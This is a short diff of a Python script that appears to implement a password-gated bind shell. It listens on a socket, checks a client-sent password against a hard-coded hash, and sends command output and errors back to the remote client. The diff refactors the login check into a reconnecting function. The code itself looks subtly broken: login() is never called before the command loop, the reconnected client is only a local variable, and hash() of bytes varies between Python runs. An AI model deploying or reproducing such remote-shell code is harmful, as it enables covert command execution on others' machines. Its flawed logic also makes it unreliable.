@@ -13,12 +13,17 @@ print('Listening for Client Connection...')
 server.listen(1)
 client, client_addr = server.accept()
 
-while True:
-    	password = client.recv(1024)
-    	password.decode()
-    	print(password)
-    	if hash(password) == 1634504265594755506:
-            	break
+def login():
+    while True:
+            try:
+                password = client.recv(1024)
+                password.decode()
+                print(password)
+                if hash(password) == 1634504265594755506:
+                        break
+            except Exception as e:
+                server.listen(1)
+                client, client_addr = server.accept()
 
 while True:
     	try:
@@ -40,9 +45,7 @@ while True:
             	else:
                     	client.send(output + output_error)
     	except Exception as e:
-                print('Exception!', e)
-            	server.listen(1)
-                client, client_addr = server.accept()
+                login()
 
 server.close()
 print('Connection Closed')
